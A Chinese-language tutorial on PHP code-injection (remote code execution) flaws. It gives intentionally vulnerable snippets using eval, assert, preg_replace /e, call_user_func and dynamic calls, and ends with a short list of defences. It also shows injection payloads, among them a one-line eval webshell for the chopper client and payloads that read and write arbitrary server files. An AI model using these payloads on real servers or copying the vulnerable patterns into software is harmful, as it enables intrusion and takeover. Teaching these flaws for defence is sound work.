# PHP代码注入

RCE 远程代码执行

## 原理以及成因

 
PHP代码执行（注入）（Web方面）是指应用程序过滤不严，用户可以通过请求将代码注入到应用中执行。代码执行（注入）类似于SQL注入漏洞，SQLi是将SQL语句注入到数据库中执行，而代码执行则是可以把代码注入到应用中最终由服务器运行它。这样的漏洞如果没有特殊的过滤，相当于直接有一个Web后门的存在。

1. 程序中含有可以执行PHP代码的函数或者语言结构
2. 传入第一点中的参数，客户端可控，直接修改或者影响

## 漏洞危害

Web应用如果存在代码执行漏洞是一件非常可怕的事情，就像一个人没有穿衣服，赤裸裸的暴露在光天化日之下。可以通过代码执行漏洞继承Web用户权限，执行任意代码。如果服务器没有正确配置，Web用户权限比较高的话，我们可以读写目标服务器任意文件内容，甚至控制整个网站以及服务器。

相关函数和语句

- eval()

eval()会将字符串当作php代码执行。

测试代码如下：

```
<?php
if(isset($_GET['code'])){
    $code=$_GET['code'];
    eval($code);
}else{
    echo "Please submit code!<br />?code=phpinfo();";
}
?>
```

提交变量[?code=phpinfo();]

我们提交以下参数也是可以的
[?code=${phpinfo()};]
[?code=1;phpinfo();]

- assert()

assert()同样会作为PHP代码执行
测试代码如下

<?php
if(isset($_GET['code'])){
  $code=$_GET['code'];
  assert($code);
}else{
  echo "Please submit code!<br />?code=phpinfo();";
}
?>

提交参数[?code=phpinfo()]

- preg_replace()

preg_replace()函数的作用是对字符串进行正则处理。
参数和返回值如下
mixed preg_replace(mixed $pattern,mixed $replacement,mixed $subject[,int limit = -1[,int &$count]])

这段代码的含义是搜索￥subject中匹配￥pattern的部分，以￥replacement进行替换，而当$pattern处，即第一个参数存在e修饰符时，$replacement的值会被当作PHP代码执行。典型的代码如下
<?php
if(isset($_GET['code'])){
    $code=$_GET['code'];
    preg_replace("/\[(.*)\]/e",'\\1',$code);
}else{
    echo"?code=[phpinfo()]";
}
?>

提交参数[?code=[phpinfo()]].phpinfo()会被执行

- call_user_func()

call_user_func()等函数都有调用其他函数的功能，其中的一个参数作为要调用的函数名，那如果这个传入的函数名可控，那就可以调用意外的函数来执行我们想要的代码，也就是存在任意代码执行漏洞。

以call_user_func()为例子，该函数的第一个参数作为回调函数，后面的参数为回调函数的参数，测试代码如下
<?php
if(isset($_GET['fun'])){
    $fun=$_GET['fun'];
    $para=$_GET['para'];
    call_user_func($fun,$para);
}else{
    echo"?fun=assert&amp;para=phpinfo()";
}
?>

提交参数[?fun=assert&para=phpinfo()]

- 动态函数$a($b)

由于PHP的特性原因，PHP的函数支持直接由拼接的方式调用，这直接导致了PHP再安全上的控制又加大了难度。不少知名的程序中也用到了动态函数的写法，这种写法跟使用call_user_func()的初衷一样，用来更加方便地调用函数，但是一旦过滤不严格就会造成代码执行漏洞。测试代码如下
<?php
if(isset($_GET['a'])){
    $a=$_GET['a'];
    $b=$_GET['b'];
    $a($b);
}else{
    echo "
    ?a=assert&amp;b=phpinfo()
    ";
}
?>

提交参数[?a=assert&b=phpinfo()]

# 漏洞利用

代码执行漏洞的利用方式有很多种，以下简单列出几种

- 直接获取Shell
提交参数[?code=@eval($_POST[1]);].即可构成一句话木马，密码为[1].可以使用菜刀连接。

- 获取当前文件的绝对路径
__FILE__是PHP预定义常量，其含义当前文件的路径，提交代码[?code=print(__FILE__);]

- 读文件

我们可以利用file_get_contents()函数读取任意文件，前提是知道目标文件路径和读取权限。提交代码[?code=var_dump(file_get_contents('C:\windows\system32\drivers\etc\hosts'));]
读取服务器hosts文件

- 写文件

我们可以利用file_put_contentd()函数，写入文件。前提是知道可写目录。
提交代码[?code=var_dump(file_put_contents($_POST[1],$_POST[2]));]
此时需要借助于hackbar通过post方式提交参数
[1=shell.php&2=<?php phpinfo()?>]
即可再当前目录下创建一个文件shell.jpg

# 防御方法

1. 尽量不要使用eval等函数
2. 如果使用的话一定要进行严格的过滤
3. preg_replace放弃使用/e修饰符
4. 修改php.ini将相关函数禁用（一般不使用）